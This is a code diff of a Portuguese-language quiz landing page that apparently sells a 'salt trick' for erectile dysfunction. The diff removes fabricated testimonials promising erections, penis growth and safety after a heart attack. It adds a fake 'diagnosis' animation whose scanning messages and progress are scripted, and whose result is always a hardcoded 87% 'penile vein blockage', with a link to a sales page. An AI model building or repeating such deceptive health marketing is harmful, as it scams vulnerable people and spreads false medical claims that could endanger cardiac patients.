+        <div class="screen analysis-screen" id="analysisScreen">
+            <div class="analysis-title">A <span>analisar</span> as tuas respostas...</div>
+            <div class="circle-chart">
+                <svg viewBox="0 0 160 160">
+                    <defs>
+                        <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="0%">
+                            <stop offset="0%" stop-color="#f5a623" />
+                            <stop offset="100%" stop-color="#f7c948" />
+                        </linearGradient>
+                    </defs>
+                    <circle class="bg" cx="80" cy="80" r="72" />
+                    <circle class="progress" id="circleProgress" cx="80" cy="80" r="72" />
+                </svg>
+                <div class="pct" id="pctDisplay">0<small>%</small></div>
             </div>
+            <div class="analysis-terminal" id="analysisTerminal"></div>
         </div>
-    </div>
 
-    <div class="comment" data-id="4">
-        <div class="avatar" style="background-image: url('images/3.jpg');"></div>
-        <div class="content">
-            <div class="author">Miguel Costa <span class="time">Há 1 hora</span></div>
-            <div class="text">Aos 61 anos, achei que minha vida sexual tinha acabado. Mas com esse método natural de sal, voltei a ter ereções como aos 25! <strong>Minha mulher está impressionada</strong> e nossa relação renasceu.</div>
-            <div class="actions">
-                <span class="like-count"><i class="fas fa-thumbs-up"></i> 312</span>
-                <span class="reply">Responder</span>
+        <!-- ===== RESULTADO ===== -->
+        <div class="screen result-screen" id="resultScreen">
+            <div class="result-badge">Resultado gerado com sucesso</div>
+            <div class="result-desc">
+                As tuas respostas indicam <strong>um bloqueio nas veias do pénis,</strong> o sangue não está a circular como devia. É por isso que ficas meio duro, perdes a ereção e evitas intimidade.<br><br>
+                A boa notícia é que <strong>Homens como tu estão a resolver esse problema em 7 dias</strong> com um truque caseiro que usa <strong>sal</strong> para desbloquear a circulação e devolve a dureza que tinhas aos 20.
             </div>
-        </div>
-    </div>
-
-    <div class="comment" data-id="5">
-        <div class="avatar" style="background-image: url('images/4.jpg');"></div>
-        <div class="content">
-            <div class="author">António Fernandes <span class="time">Há 19 minutos</span></div>
-            <div class="text">Gastava mais de 5.000 meticais por mês em Viagra e sprays. Agora com o sal, tenho ereções naturais que duram <strong>mais de 50 minutos</strong>. Economizo dinheiro e tenho melhor desempenho</div>
-            <div class="actions">
-                <span class="like-count"><i class="fas fa-thumbs-up"></i> 147</span>
-                <span class="reply">Responder</span>
+            <div class="result-meter">
+                <div class="result-meter-label">
+                    <span>Nível de bloqueio</span>
+                    <span id="blockLevel">87%</span>
+                </div>
+                <div class="result-meter-bar">
+                    <div class="result-meter-fill" id="blockFill"></div>
+                </div>
             </div>
+            <a href="https://zaoa.vercel.app/aoa" class="btn-action">Ver o método →</a>
         </div>
-    </div>
 
-    <div class="comment" data-id="6">
-        <div class="avatar" style="background-image: url('images/5.jpg');"></div>
-        <div class="content">
-            <div class="author">Paulo Machava <span class="time">Há 19 minutos</span></div>
-            <div class="text">Depois do infarto, os médicos proibiram Viagra. Pensei que nunca mais teria uma vida sexual normal. O sal me salvou, é <strong>100% natural</strong> e não faz mal ao coração. Ereções duras como pedra!</div>
-            <div class="actions">
-                <span class="like-count"><i class="fas fa-thumbs-up"></i> 98</span>
-                <span class="reply">Responder</span>
-            </div>
+        <div class="quiz-footer">
+           
         </div>
-    </div>
-
-    <div class="comment" data-id="7">
-        <div class="avatar" style="background-image: url('images/6.jpg');"></div>
-        <div class="content">
-            <div class="author">Ricardo Dauto <span class="time">Há 19 minutos</span></div>
-            <div class="text">Minha autoestima estava no chão. Com 49 anos já não conseguia mais ter relações. O truque do sal mudou tudo - em 10 dias meu pênis cresceu <strong>3cm</strong> e as ereções são explosivas! Minha mulher não para de elogiar.</div>
-            <div class="actions">
-                <span class="like-count"><i class="fas fa-thumbs-up"></i> 215</span>
-                <span class="reply">Responder</span>
-            </div>
-        </div>
-    </div>
-
-    <h4 class="comments-closed">Este post já não está a receber comentários!</h4>
-</div>
-
     </div>
 
     <script>
@@ -484,52 +837,184 @@
         })();
 
         /* ============================================================
-           CONTADOR AO VIVO
+           SOM SUBTIL (Web Audio API)
         ============================================================ */
-        const liveSpan = document.getElementById('liveCount');
-        if (liveSpan) {
-            setInterval(() => {
-                const base = 1234;
-                const variation = Math.floor(Math.random() * 400) - 200;
-                const val = Math.max(800, base + variation);
-                liveSpan.textContent = val.toLocaleString('pt-PT');
-            }, 15000);
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        let audioCtx = null;
+
+        function playTone(freq, duration, type = 'sine', vol = 0.04) {
+            try {
+                if (!audioCtx) audioCtx = new AudioCtx();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = type;
+                osc.frequency.value = freq;
+                gain.gain.setValueAtTime(vol, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + duration);
+            } catch(e) {}
         }
 
-        /* ============================================================
-           LIKES NOS COMENTÁRIOS
-        ============================================================ */
-        document.querySelectorAll('.comment .like-count').forEach(el => {
-            const icon = el.querySelector('i');
-            const textNode = el.childNodes[1];
-            let count = parseInt(textNode.textContent.trim()) || 0;
-            let liked = false;
-            el.addEventListener('click', function(e) {
-                e.stopPropagation();
-                if (!liked) {
-                    count += 1;
-                    liked = true;
-                    el.classList.add('liked');
-                    icon.style.color = '#f5a623';
-                } else {
-                    count -= 1;
-                    liked = false;
-                    el.classList.remove('liked');
-                    icon.style.color = '';
-                }
-                textNode.textContent = ' ' + count;
-            });
-        });
+        function soundClick() { playTone(880, 0.08, 'sine', 0.03); }
+        function soundSelect() { playTone(1200, 0.12, 'sine', 0.05); setTimeout(() => playTone(1600, 0.1, 'sine', 0.04), 60); }
+        function soundDone() { playTone(660, 0.15, 'sine', 0.05); setTimeout(() => playTone(880, 0.15, 'sine', 0.05), 120); setTimeout(() => playTone(1320, 0.3, 'sine', 0.06), 240); }
 
         /* ============================================================
-           REPLY (FECHADO)
+           QUIZ LOGIC
         ============================================================ */
-        document.querySelectorAll('.reply').forEach(el => {
-            el.addEventListener('click', function(e) {
-                e.stopPropagation();
-                alert('💬 Os comentários estão fechados para esta demonstração.');
+        document.addEventListener('DOMContentLoaded', () => {
+            const screens = document.querySelectorAll('.screen');
+            const steps = document.querySelectorAll('.step');
+            const total = steps.length;
+            let current = 0;
+            let answers = [];
+
+            const progressBar = document.getElementById('progressBar');
+            const stepLabel = document.getElementById('stepLabel');
+            const introScreen = document.getElementById('introScreen');
+            const stepsContainer = document.getElementById('stepsContainer');
+            const analysisScreen = document.getElementById('analysisScreen');
+            const resultScreen = document.getElementById('resultScreen');
+            const analysisTerminal = document.getElementById('analysisTerminal');
+
+            const circle = document.getElementById('circleProgress');
+            const pctDisplay = document.getElementById('pctDisplay');
+            const CIRCUM = 2 * Math.PI * 72;
+
+            const startBtn = document.getElementById('startBtn');
+
+            // ---- INÍCIO ----
+            startBtn.addEventListener('click', () => {
+                soundClick();
+                introScreen.classList.remove('active');
+                stepsContainer.style.display = 'block';
+                showStep(0);
             });
+
+            function updateProgress() {
+                const pct = ((current + 1) / total) * 100;
+                progressBar.style.width = pct + '%';
+                stepLabel.textContent = (current + 1) + ' / ' + total;
+            }
+
+            function showStep(index) {
+                steps.forEach((s, i) => {
+                    s.classList.toggle('active', i === index);
+                });
+                updateProgress();
+                fitToViewport();
+            }
+
+            function goNext() {
+                if (current < total - 1) {
+                    current++;
+                    showStep(current);
+                } else {
+                    startAnalysis();
+                }
+            }
+
+            document.querySelectorAll('.option').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const parent = this.closest('.step');
+                    parent.querySelectorAll('.option').forEach(b => b.classList.remove('selected'));
+                    this.classList.add('selected');
+                    soundSelect();
+
+                    const val = this.getAttribute('data-value');
+                    const idx = parseInt(parent.getAttribute('data-step'));
+                    answers[idx] = val;
+
+                    setTimeout(goNext, 400);
+                });
+            });
+
+            /* ============================================================
+               ANÁLISE
+            ============================================================ */
+            function startAnalysis() {
+                stepsContainer.style.display = 'none';
+                analysisScreen.classList.add('active');
+                fitToViewport();
+                soundDone();
+
+                circle.style.strokeDasharray = CIRCUM;
+                circle.style.strokeDashoffset = CIRCUM;
+
+                const analysisMessages = [
+                    { text: 'A verificar padrões de circulação...', time: 0 },
+                    { text: 'A analisar saúde das veias do pénis...', time: 900 },
+                    { text: 'A comparar com 12.847 casos semelhantes...', time: 1900 },
+                    { text: 'A calcular tempo de recuperação...', time: 2900 },
+                    { text: 'A gerar diagnóstico personalizado...', time: 3900 }
+                ];
+
+                analysisMessages.forEach((msg, i) => {
+                    setTimeout(() => {
+                        const line = document.createElement('div');
+                        line.className = 'line';
+                        const isLast = i === analysisMessages.length - 1;
+                        line.innerHTML = `<span class="dot${isLast ? ' done' : ''}"></span><span>${msg.text}${isLast ? ' <span class="check">✓</span>' : ''}</span>`;
+                        analysisTerminal.appendChild(line);
+                    }, msg.time);
+                });
+
+                let pct = 0;
+                const interval = setInterval(() => {
+                    pct += Math.floor(Math.random() * 3) + 1;
+                    if (pct > 100) pct = 100;
+                    const offset = CIRCUM - (pct / 100) * CIRCUM;
+                    circle.style.strokeDashoffset = offset;
+                    pctDisplay.innerHTML = pct + '<small>%</small>';
+
+                    if (pct === 100) {
+                        clearInterval(interval);
+                        setTimeout(() => {
+                            analysisScreen.classList.remove('active');
+                            resultScreen.classList.add('active');
+                            fitToViewport();
+                            animateBlockMeter();
+                            soundDone();
+                        }, 900);
+                    }
+                }, 60);
+            }
+
+            function animateBlockMeter() {
+                const fill = document.getElementById('blockFill');
+                const label = document.getElementById('blockLevel');
+                let val = 0;
+                const target = 87;
+                const interval = setInterval(() => {
+                    val += 2;
+                    if (val > target) val = target;
+                    fill.style.width = val + '%';
+                    label.textContent = val + '%';
+                    if (val >= target) clearInterval(interval);
+                }, 20);
+            }
+
+            showStep(0);
         });
+
+        function fitToViewport() {
+            const card = document.getElementById('app');
+            if (!card) return;
+            card.style.transform = 'scale(1)';
+            const available = window.innerHeight - 32;
+            const needed = card.offsetHeight;
+            if (needed > available) {
+                const scale = available / needed;
+                card.style.transform = `scale(${scale})`;
+            }
+        }
+
+        window.addEventListener('load', fitToViewport);
+        window.addEventListener('resize', fitToViewport);
+        window.addEventListener('orientationchange', fitToViewport);
     </script>
 
 </body>
